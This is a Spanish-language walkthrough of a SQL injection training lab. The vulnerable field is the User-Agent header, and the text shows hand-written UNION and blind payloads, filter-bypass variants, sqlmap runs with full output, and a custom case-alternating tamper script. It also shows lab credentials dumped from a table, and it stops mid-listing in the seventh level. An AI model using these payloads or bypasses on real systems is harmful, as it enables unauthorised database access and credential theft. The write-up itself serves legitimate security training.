---
layout: default
---

# SQLI LAB 1

## Enunciado 

```
Lab 3: SQLi Labs
CodeName: What's your browser?
The SQL Injection labs contain 10 challenges:
Warm-up: SQLi level 1
Easy: SQLi level 2
Easy: SQLi level 3
Medium: SQLi level 4
Medium: SQLi level 5
Hard: SQLi level 6
Hard: SQLi level 7
Medium: SQLi level 8
Medium: SQLi level 9
Hard: SQLi level 10
Description
You are a pentester, and "Web statistics" hired you to pentest their browsers statistic application. The application stores information about browsers in a DB.

Each level wrongly escape inputs, and you have to bypass some server-side PHP/MySQL filters.

The solutions you will see are just a few of the many you can have. As a suggestion, once you will finish these labs, you can try to solve them again using your way and alternative techniques. You can find the solutions at http://info.sqli.labs/solutions.html

The full list of all the labs and the related descriptions are available at: http://info.sqli.labs/
```

Task:
```
Objective
You will need to reach different goals at every level.

Content Image

Tool
The best tool for this lab are:

Burp Suite
sqlmap
A web browser
```

```
Lab ID 	Description 	Difficulty
SQLi 1 	This level is just a warm-up to become familiar with the application 	WARM-UP
SQLi 2 	Are you using common injection vectors? 	EASY
SQLi 3 	What'shappeningnow? 	EASY
SQLi 4 	Evenworse 	MEDIUM
SQLi 5 	As Snoopy says "Keep looking up... That's the secret of life..." 	MEDIUM
SQLi 6 	Don't try to inject "UNION SELECT" here! 	ADVANCED
SQLi 7 	We got case insensitive. 	ADVANCED
SQLi 8 	Back to something basic, check out your favourite site to get a clue. 	MEDIUM
SQLi 9 	Re-check ;) 	MEDIUM
SQLi 10 	Something simple can (sometimes) get in your way to the goal 	ADVANCED
```

El atributo vulnerable a los a taques del tipo inyección SQL será User-Agent


### SQLi 1

Tipo de inyección:
```
GET / HTTP/1.1
Host: 1.sqli.labs
User-Agent: ' UNION SELECT user(); -- -
```


```bash
sqlmap -u 'http://1.sqli.labs/' -p user-agent --random-agent --banner
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.3.22#dev}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:28:33 /2025-01-02/

[13:28:33] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Windows NT 5.0; en-US; rv:1.9b4) Gecko/2008030318 Firefox/3.0b4' from file '/opt/sqlmap/data/txt/user-agents.txt'
[13:28:33] [INFO] testing connection to the target URL
[13:28:33] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:28:33] [INFO] testing if the target URL content is stable
[13:28:34] [INFO] target URL content is stable
[13:28:34] [INFO] testing if parameter 'User-Agent' is dynamic
[13:28:34] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[13:28:34] [INFO] heuristic (basic) test shows that parameter 'User-Agent' might be injectable (possible DBMS: 'MySQL')
[13:28:34] [INFO] testing for SQL injection on parameter 'User-Agent'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:28:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:28:49] [WARNING] reflective value(s) found and filtering out
[13:28:49] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:28:49] [INFO] testing 'Generic inline queries'
[13:28:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:28:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:28:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[13:28:51] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[13:28:51] [INFO] parameter 'User-Agent' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --string="19")
[13:28:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:28:51] [INFO] parameter 'User-Agent' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[13:28:51] [INFO] testing 'MySQL inline queries'                                                                                                                                            
[13:28:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:28:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:28:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:28:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:28:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[13:28:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[13:28:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:29:01] [INFO] parameter 'User-Agent' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:29:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:29:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:29:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:29:01] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[13:29:01] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[13:29:01] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[13:29:02] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[13:29:02] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[13:29:02] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[13:29:02] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[13:29:03] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[13:29:03] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 364 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: Mozilla/5.0 (X11; U; Windows NT 5.0; en-US; rv:1.9b4) Gecko/2008030318 Firefox/3.0b4' RLIKE (SELECT (CASE WHEN (2678=2678) THEN 0x4d6f7a696c6c612f352e3020285831313b20553b2057696e646f7773204e5420352e303b20656e2d55533b2072763a312e39623429204765636b6f2f323030383033303331382046697265666f782f332e306234 ELSE 0x28 END))-- GldW

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: Mozilla/5.0 (X11; U; Windows NT 5.0; en-US; rv:1.9b4) Gecko/2008030318 Firefox/3.0b4' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71716a7871,(SELECT (ELT(9989=9989,1))),0x716b767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- rXVe

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: Mozilla/5.0 (X11; U; Windows NT 5.0; en-US; rv:1.9b4) Gecko/2008030318 Firefox/3.0b4' AND (SELECT 7907 FROM (SELECT(SLEEP(5)))ciXo)-- jjAu
---
[13:29:11] [INFO] the back-end DBMS is MySQL
[13:29:11] [INFO] fetching banner
[13:29:11] [INFO] retrieved: '5.5.47-0ubuntu0.14.04.1'
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.5
banner: '5.5.47-0ubuntu0.14.04.1'
[13:29:11] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/1.sqli.labs'
[13:29:11] [WARNING] your sqlmap version is outdated

[*] ending @ 13:29:11 /2025-01-02/
```

Tables:

```bash
[13:31:12] [INFO] retrieved: 'browsers'
Database: 1sqlilabs
[1 table]
+---------------------------------------+
| browsers                              |
+---------------------------------------+

Database: information_schema
[40 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_RESET                      |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+

```

### SQLi 2

UNION and standard payloads like 1='1 are filterer.
PoC, False Blind:

```bash

GET / HTTP/1.1
Host: 2.sqli.labs
User-Agent: ' or 'elscustom'='elsFALSE
```


PoC, True Blind:
```bash
GET / HTTP/1.1
Host: 2.sqli.labs
User-Agent: ' or 'elscustom'='elscustom
```

Explotación:

```bash
sqlmap -u 'http://2.sqli.labs/' -p user-agent --user-agent=elsagent --technique=B --banner
        ___
       __H__                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.5.3.22#dev}                                                                                                                                                    
|_ -| . [']     | .'| . |                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                   
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:33:23 /2025-01-02/

[13:33:23] [INFO] testing connection to the target URL
[13:33:23] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:33:23] [INFO] testing if the target URL content is stable
[13:33:24] [INFO] target URL content is stable
[13:33:24] [INFO] testing if parameter 'User-Agent' is dynamic
[13:33:24] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[13:33:24] [INFO] heuristic (basic) test shows that parameter 'User-Agent' might be injectable (possible DBMS: 'MySQL')
[13:33:24] [INFO] testing for SQL injection on parameter 'User-Agent'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:33:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:33:38] [WARNING] reflective value(s) found and filtering out
[13:33:38] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:33:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:33:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:33:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[13:33:40] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[13:33:40] [INFO] parameter 'User-Agent' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --string="There are other  users with your same browser!")
[13:33:40] [INFO] checking if the injection point on User-Agent parameter 'User-Agent' is a false positive
[13:33:40] [WARNING] it appears that some non-alphanumeric characters (i.e. ()) are filtered by the back-end server. There is a strong possibility that sqlmap won't be able to properly exploit this vulnerability
parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 174 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: elsagent' RLIKE (SELECT (CASE WHEN (5883=5883) THEN 0x656c736167656e74 ELSE 0x28 END)) AND 'zClB'='zClB
---
[13:33:45] [INFO] the back-end DBMS is MySQL
[13:33:45] [INFO] fetching banner
[13:33:45] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[13:33:45] [INFO] retrieved: 5.5.47-0ubuntu0.14.04.1
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL Unknown
banner: '5.5.47-0ubuntu0.14.04.1'
[13:33:47] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/2.sqli.labs'
[13:33:47] [WARNING] your sqlmap version is outdated

[*] ending @ 13:33:47 /2025-01-02/

```
Tables:
```bash
Database: 2sqlilabs
[1 table]
+---------------------------------------+
| browsers                              |
+---------------------------------------+

Database: information_schema
[40 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_RESET                      |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+

```


### SQLi 3


Inyección:
```bash
GET / HTTP/1.1
Host: 3.sqli.labs
User-Agent: '/**/UNION/**/SELECT/**/@@version;#
```

Explotación:

```bash
sqlmap -u 'http://3.sqli.labs/' -p user-agent --random-agent --technique=U --tamper=space2comment --suffix=';#' --union-char=els --banner
        ___
       __H__                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.5.3.22#dev}                                                                                                                                                    
|_ -| . [']     | .'| . |                                                                                                                                                                   
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                   
      |_|V...       |_|   http://sqlmap.org                                                                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:31:41 /2025-01-02/

[14:31:41] [INFO] loading tamper module 'space2comment'
[14:31:41] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.812.0 Safari/535.1' from file '/opt/sqlmap/data/txt/user-agents.txt'                                                                                                                                                                      
[14:31:41] [INFO] testing connection to the target URL
[14:31:41] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:31:41] [INFO] heuristic (basic) test shows that parameter 'User-Agent' might be injectable (possible DBMS: 'MySQL')
[14:31:41] [INFO] testing for SQL injection on parameter 'User-Agent'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[14:32:06] [INFO] testing 'Generic UNION query (els) - 1 to 10 columns'
[14:32:06] [WARNING] reflective value(s) found and filtering out
[14:32:06] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:32:06] [INFO] target URL appears to have 1 column in query
[14:32:06] [INFO] parameter 'User-Agent' is 'Generic UNION query (els) - 1 to 10 columns' injectable
[14:32:06] [INFO] checking if the injection point on User-Agent parameter 'User-Agent' is a false positive
parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 23 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: UNION query
    Title: Generic UNION query (els) - 1 column
    Payload: -8215' UNION ALL SELECT CONCAT(0x7162707171,0x417a5555506263434b4e5a4653426971766e78756b49684977496e724d625476476944446b544e70,0x716b6a6a71);#
---
[14:32:10] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[14:32:10] [INFO] testing MySQL
[14:32:10] [INFO] confirming MySQL
[14:32:10] [INFO] the back-end DBMS is MySQL
[14:32:10] [INFO] fetching banner
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS operating system: Linux Ubuntu
back-end DBMS: MySQL >= 5.0.0
banner: '5.5.47-0ubuntu0.14.04.1'
[14:32:11] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/3.sqli.labs'
[14:32:11] [WARNING] your sqlmap version is outdated

[*] ending @ 14:32:11 /2025-01-02/

```

Tables:
```
Database: 3sqlilabs                                                                                                                                                                        
[2 tables]
+---------------------------------------+
| accounts                              |
| browsers                              |
+---------------------------------------+

Database: information_schema
[40 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_RESET                      |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+


```
Accounts:
```bash
Database: 3sqlilabs                                                                                                                                                                        
Table: accounts
[2 entries]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| admin    | Qijfb7XS8jurkjo24YtU |
| luctus   | Aenean               |
+----------+----------------------+

```


### SQLi 4

```bash
GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: 'UNION(select('PoC String'));#
```
To exploit by hand you have to first find the tables in the current database:
```bash
GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: 'union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
```


```bash
GET / HTTP/1.1
Host: 4.sqli.labs
User-Agent: 'union(SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='secretcustomers'));#
```


### SQLi 5

```bash
GET / HTTP/1.1
Host: 5.sqli.labs
User-Agent: "UNION(select('PoC String'));#
```

```bash
GET / HTTP/1.1
Host: 5.sqli.labs
User-Agent: "union(SELECT(group_concat(table_name))FROM(information_schema.columns)where(table_schema=database()));#
```



### SQLi 6


Use tamper:

```python
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces each keyword a CaMeLcAsE VeRsIoN of it.

    >>> tamper('INSERT')
    'InSeRt'
    """

    retVal = str()

    if payload:
        for i in xrange(len(payload)):
            if (i % 2 == 0):
                # We cannot break 0x12345
                if not ((payload[i] == 'x') and (payload[i-1] == '0')):
                    retVal += payload[i].upper()
                else:
                    retVal += payload[i]
            else:
                retVal += payload[i].lower()
    return retVal
```


```bash
sqlmap -u 'http://6.sqli.labs/' -p user-agent --tamper=/usr/share/sqlmap/tamper/customtamper.py  --level=3 --risk=3 --dbms=Mysql --random-agent
```

```bash
[17:37:31] [INFO] parameter 'User-Agent' is 'Generic UNION query (random number) - 1 to 20 columns' injectable
[17:37:31] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 161 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.0.5) Gecko/20060731 Ubuntu/dapper-security Firefox/1.5.0.5' OR NOT 5080=5080-- EGwk

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.8.0.5) Gecko/20060731 Ubuntu/dapper-security Firefox/1.5.0.5' AND (SELECT 5690 FROM (SELECT(SLEEP(5)))WqIP)-- nQDq

    Type: UNION query
    Title: Generic UNION query (random number) - 1 column
    Payload: -2791' UNION ALL SELECT CONCAT(0x71626b7671,0x73667557684646716654524b7257647953707942545444797742756a6c44536b73506c5042736a50,0x7171787671)-- -
---
[17:37:38] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[17:37:38] [INFO] the back-end DBMS is MySQL
-9164' uNiOn aLl sElEcT CoNcAt(0x71626B7671,(cAsE WhEn (VeRsIoN() LiKe 0x254D61726961444225) tHeN 1 ElSe 0 eNd),0x7171787671)-- -
-4055' uNiOn aLl sElEcT CoNcAt(0x71626B7671,(cAsE WhEn (VeRsIoN() LiKe 0x255469444225) tHeN 1 ElSe 0 eNd),0x7171787671)-- -
-5513' uNiOn aLl sElEcT CoNcAt(0x71626B7671,(cAsE WhEn (@@VeRsIoN_CoMmEnT LiKe 0x256472697A7A6C6525) tHeN 1 ElSe 0 eNd),0x7171787671)-- -
-5129' uNiOn aLl sElEcT CoNcAt(0x71626B7671,(cAsE WhEn (@@VeRsIoN_CoMmEnT LiKe 0x25506572636F6E6125) tHeN 1 ElSe 0 eNd),0x7171787671)-- -
-1329' uNiOn aLl sElEcT CoNcAt(0x71626B7671,(cAsE WhEn (AuRoRa_vErSiOn() lIkE 0x25) ThEn 1 eLsE 0 EnD),0x7171787671)-- -
-4953' uNiOn aLl sElEcT CoNcAt(0x71626B7671,(cAsE WhEn (AuRoRa_vErSiOn() lIkE 0x25) ThEn 1 eLsE 0 EnD),0x7171787671)-- -
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.12

```

tables:
```bash
[17:38:56] [INFO] retrieved: '6sqlilabs','email'
Database: 6sqlilabs                                                                                                                                                                        
[2 tables]
+---------------------------------------+
| browsers                              |
| email                                 |
+---------------------------------------+

Database: information_schema
[40 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_RESET                      |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+

```

### SQLi 7


```bash
sqlmap -u 'http://7.sqli.labs/' -p user-agent --tamper=/usr/share/sqlmap/tamper/fill.py  --level=3 --risk=3 --dbms=Mysql --random-agent
```

```bash
[17:42:57] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
parameter 'User-Agent' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 124 HTTP(s) requests:
---
Parameter: User-Agent (User-Agent)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; da) Opera 8.54' OR NOT 4267=4267-- uKcK

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; da) Opera 8.54' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178627671,(SELECT (ELT(2523=2523,1))),0x716a6b7871,0x78))s), 8446744073709551610, 8446744073709551610)))-- gyJg

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; da) Opera 8.54' AND (SELECT 6075 FROM (SELECT(SLEEP(5)))iUmB)-- zDcU

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: -4334' UNION ALL SELECT CONCAT(0x7178627671,0x636774524b6778755a4b695466534e4365424642794e62514257546b6b4141486368796178427948,0x716a6b7871)-- -
---
[17:48:13] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[17:48:13] [INFO] the back-end DBMS is MySQL
pretamper: -2244' UNION ALL SELECT CONCAT(0x7178627671,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x716a6b7871)-- -
pretamper: -1522' UNION ALL SELECT CONCAT(0x7178627671,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x716a6b7871)-- -
pretamper: -4598' UNION ALL SELECT CONCAT(0x7178627671,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x716a6b7871)-- -
pretamper: -9757' UNION ALL SELECT CONCAT(0x7178627671,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x716a6b7871)-- -
pretamper: -9936' UNION ALL SELECT CONCAT(0x7178627671,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a6b7871)-- -
pretamper: -6789' UNION ALL SELECT CONCAT(0x7178627671,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a6b7871)-- -
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.5
[17:48:13] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/7.sqli.labs'

```


```bash
[17:49:47] [INFO] retrieved: '7sqlilabs','email'
Database: 7sqlilabs                                                                                                                                                                        
[2 tables]
+---------------------------------------+
| browsers                              |
| email                                 |
+---------------------------------------+

Database: information_schema
[40 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_RESET                      |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
